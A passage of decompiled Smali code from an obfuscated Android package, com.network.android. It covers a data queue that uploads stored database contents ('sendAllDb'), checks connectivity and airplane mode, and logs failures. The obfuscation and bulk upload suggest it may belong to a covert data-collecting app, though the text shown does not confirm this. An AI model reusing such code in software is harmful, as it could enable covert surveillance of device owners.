    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {v8, v9}, Lcom/network/android/b/a;->b(Lcom/network/android/i;)Lcom/network/android/i;

    move v0, v7

    goto/16 :goto_1

    :cond_6
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "sendAllDb Fail to send data: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v1, Lcom/network/b/b;->k:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " return code: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget v1, v2, Lcom/network/android/x;->a:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->b(Ljava/lang/String;)V

    sget v0, Lcom/network/b/b;->k:I

    add-int/lit8 v0, v0, 0x1

    sput v0, Lcom/network/b/b;->k:I
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_0

    move v0, v7

    goto/16 :goto_2

    :catch_0
    move-exception v0

    :try_start_4
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "sendAllDb iteraction: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_1

    move v0, v7

    goto/16 :goto_1

    :catch_1
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "sendAllDb: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    const/4 v0, 0x1

    const/16 v1, 0x7da

    const-string v2, "LOG_EXCEPTION_WHILE_HANDLING_DATA_QUEUE"

    invoke-static {v0, v1, v2}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    goto/16 :goto_3
.end method

.method public static c(Landroid/content/Context;)Z
    .locals 3

    const/4 v0, 0x0

    const/4 v1, 0x1

    const-string v2, "DataQueue shouldSend"

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0, v1, v1}, Lcom/network/android/j;->a(Landroid/content/Context;ZZ)Z

    move-result v2

    if-nez v2, :cond_0

    const-string v1, "sendAllDb exit cannot send: DataQueue.cantSend!!!!"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :goto_0
    return v0

    :cond_0
    invoke-static {p0}, Lcom/network/android/j;->g(Landroid/content/Context;)Lcom/network/android/b/a;

    move-result-object v2

    invoke-virtual {v2}, Lcom/network/android/b/a;->b()Z

    move-result v2

    if-nez v2, :cond_1

    const-string v1, "sendAllDb exit cannot send: no data!!!!"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto :goto_0

    :cond_1
    move v0, v1

    goto :goto_0
.end method

.method public static d(Landroid/content/Context;)Z
    .locals 1

    invoke-static {p0}, Lcom/network/android/j;->g(Landroid/content/Context;)Lcom/network/android/b/a;

    move-result-object v0

    invoke-virtual {v0}, Lcom/network/android/b/a;->b()Z

    move-result v0

    return v0
.end method

.method public static e(Landroid/content/Context;)Z
    .locals 4

    const/4 v1, 0x1

    :try_start_0
    const-string v0, "connectivity"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/net/NetworkInfo;->isConnectedOrConnecting()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    move-result v0

    if-eqz v0, :cond_0

    move v0, v1

    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "isOnline: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    move v0, v1

    goto :goto_0
.end method

.method private static f(Landroid/content/Context;)Z
    .locals 3

    const/4 v0, 0x0

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "airplane_mode_on"

    invoke-static {v1, v2, v0}, Landroid/provider/Settings$System;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;I)I

    move-result v1

    if-eqz v1, :cond_0

    const/4 v0, 0x1

    :cond_0
    return v0
.end method

.method private static g(Landroid/content/Context;)Lcom/network/android/b/a;
    .locals 1

    sget-object v0, Lcom/network/android/j;->h:Lcom/network/android/b/a;

    if-nez v0, :cond_0

    new-instance v0, Lcom/network/android/b/a;

    invoke-direct {v0, p0}, Lcom/network/android/b/a;-><init>(Landroid/content/Context;)V

    sput-object v0, Lcom/network/android/j;->h:Lcom/network/android/b/a;

    :cond_0
    sget-object v0, Lcom/network/android/j;->h:Lcom/network/android/b/a;

    return-object v0
.end method
